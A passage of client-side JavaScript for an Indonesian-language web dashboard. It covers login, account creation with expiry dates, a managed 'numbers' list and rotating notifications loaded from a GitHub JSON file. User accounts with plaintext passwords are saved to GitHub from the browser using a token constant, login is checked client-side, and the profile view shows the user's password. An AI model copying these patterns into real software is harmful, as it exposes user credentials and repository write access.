    body.appendChild(tr);
  });
}

    async function createAccount(u,p,r,expInput){
  if(!u||!p) throw new Error('Username & password wajib');
  if(state.loginList.some(x=>x.username===u)) throw new Error('Username sudah ada');

  // parse di sini, bukan langsung simpan expInput
  const expDate = parseExpired(expInput);

  if(!Array.isArray(state.loginList)) state.loginList = [];

  state.loginList.push({
    username: u,
    password: p,
    role: r,
    expired: expDate || null
  });

  await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `create user ${u}`, state.loginSha);
  await loadLogins();
  renderAccounts();
}

    // ====== UI WIRING ======
    const formLogin = document.getElementById('formLogin');
    const loginMsg = document.getElementById('loginMsg');
    const numMsg   = document.getElementById('numMsg');
    const accMsg   = document.getElementById('accMsg');
    const drawer   = document.getElementById('drawer');

    document.getElementById('btnHamburger').onclick = ()=> drawer.classList.toggle('open');

    document.querySelectorAll('.menu a[data-view]').forEach(a=>{
      a.addEventListener('click', async (e)=>{
        e.preventDefault(); const v = a.dataset.view; setView(v);
        if(v==='numbers'){ await loadNumbers(); }
        if(v==='accounts'){ await loadLogins(); renderAccounts(); }
      })
    })

    formLogin.addEventListener('submit', async (e)=>{
      e.preventDefault(); 
      loginMsg.textContent = 'Memeriksaâ€¦';
      const u = document.getElementById('username').value.trim();
      const p = document.getElementById('password').value.trim();
      try{
        const ok = await doLogin(u,p);
        if(!ok){ 
          toast(loginMsg, 'Username atau password salah', false); 
          return; 
        }
        toast(loginMsg, 'Berhasil masuk');
        document.getElementById('who').textContent = u + ' â€¢ ' + ok.role;
        document.getElementById('userBadge').classList.remove('hidden');
        document.getElementById('roleChip').textContent = ok.role;
        if(ok.role==='admin') document.getElementById('adminSection').classList.remove('hidden');
        document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');
  document.getElementById('btnLogout').onclick = logout;
    showBottomNav();
        setView('dashboard');
        await loadNumbers();
      }catch(err){ 
        toast(loginMsg, err.message, false); 
      }
    });
    document.getElementById('btnAddNumber').onclick = async()=>{
      const field = document.getElementById('numberInput');
      try{ await addNumber(field.value.trim()); toast(numMsg,'Nomor ditambahkan'); field.value=''; }
      catch(e){ toast(numMsg, e.message, false) }
    }
    document.getElementById('btnCreate').onclick = async()=>{
  const u   = document.getElementById('newUser').value.trim();
  const p   = document.getElementById('newPass').value.trim();
  const r   = document.getElementById('newRole').value; 
  const exp = document.getElementById('newExpired').value.trim() || null;

  try { 
    await createAccount(u,p,r,exp); 
    toast(accMsg,'Akun dibuat');
    document.getElementById('newUser').value='';
    document.getElementById('newPass').value='';
    document.getElementById('newExpired').value='';
  } catch(e){ 
    toast(accMsg, e.message, false); 
  }
}
    const io = new IntersectionObserver((entries)=>{
      entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible') })
    }, {threshold:.15});
    document.querySelectorAll('.reveal').forEach(el=> io.observe(el));
const bugCards = document.querySelectorAll('.bug-card');
const ioBug = new IntersectionObserver((entries)=>{
  entries.forEach(e=>{
    if(e.isIntersecting){
      bugCards.forEach((card, idx)=>{
        setTimeout(()=> card.classList.add('visible'), idx * 200); // delay 200ms per item
      });
      ioBug.disconnect();
    }
  });
}, {threshold:.2});
if(bugCards.length) ioBug.observe(bugCards[0]);

    restoreSession();

document.addEventListener("DOMContentLoaded", () => {
  const btnProfile = document.getElementById('btnProfile');
  const profileCard = document.getElementById('profileCard');
  const closeProfile = document.getElementById('closeProfile');
  const profileUsername = document.getElementById('profileUsername');
  const profilePassword = document.getElementById('profilePassword');
  const profileExpired = document.getElementById('profileExpired');
  const profileLogout = document.getElementById('profileLogout');

  function daysLeft(exp){
    if(!exp) return "Tidak ada";
    const expDate = new Date(exp).getTime();
    const now = Date.now();
    const diff = expDate - now;
    const days = Math.ceil(diff / (1000*60*60*24));
    return days > 0 ? `${days} hari lagi` : `Expired ${Math.abs(days)} hari lalu`;
  }

  btnProfile.addEventListener("click", async () => {
    await loadLogins();
    const found = state.loginList.find(u => u.username === state.user);
    if(found){
      profileUsername.textContent = found.username;
      profilePassword.textContent = found.password;
      profileExpired.textContent = daysLeft(found.expired);
    }
    profileCard.classList.add('show');
  });

  closeProfile.addEventListener("click", () => {
    profileCard.classList.remove('show');
  });

  profileLogout.addEventListener("click", logout);
});

function showPopupNotif(text, success = true) {
  const popup = document.getElementById("notifPopup");
  const popupText = document.getElementById("notifText");
  const popupIcon = popup.querySelector("i");

  popupText.textContent = text;

  if (success) {
    popupIcon.className = "fa-solid fa-circle-check";
    popupIcon.style.color = "lime";
  } else {
    popupIcon.className = "fa-solid fa-circle-xmark";
    popupIcon.style.color = "red";
  }

  popup.classList.add("show");
  popup.classList.remove("hidden");


  setTimeout(() => {
    popup.classList.remove("show");
    setTimeout(() => popup.classList.add("hidden"), 250);
  }, 3500);
}

  



async function startNotifCycle() {
  try {
    const res = await fetch("https://raw.githubusercontent.com/DaffaDevv/ACTIVITY/main/activity.json");
    const data = await res.json();

    const allMessages = Object.keys(data.Servers || {})
      .filter(k => k.toLowerCase().startsWith("message"))
      .map(k => data.Servers[k])
      .filter(Boolean);

    let queue = [];

    function shuffleMessages() {
      queue = [...allMessages];
      for (let i = queue.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [queue[i], queue[j]] = [queue[j], queue[i]];
      }
    }

    shuffleMessages();

    const box = document.getElementById("topNotif");
    const nameEl = document.getElementById("notifName");
    const msgEl = document.getElementById("notifMsg");
    const sound = document.getElementById("notifSound");
    const btnClose = document.getElementById("notifClose");

    function showNotif() {
      if (!queue.length) shuffleMessages();

      const msg = queue.shift();
      if (!msg) return;

      nameEl.textContent = "NOTIFICATION";
      msgEl.textContent = msg;
      box.classList.remove("hidden");

      if (sound) {
        sound.currentTime = 0;
        setTimeout(() => {
          sound.play().catch(err => console.warn("Audio blocked:", err));
        }, 200);
      }

      setTimeout(() => box.classList.add("hidden"), 5000);
    }

    btnClose.onclick = () => {
      box.classList.add("hidden");
    };

    showNotif();
    setInterval(showNotif, 20000); 
  } catch (err) {
    console.error("Notif error:", err);
  }
}
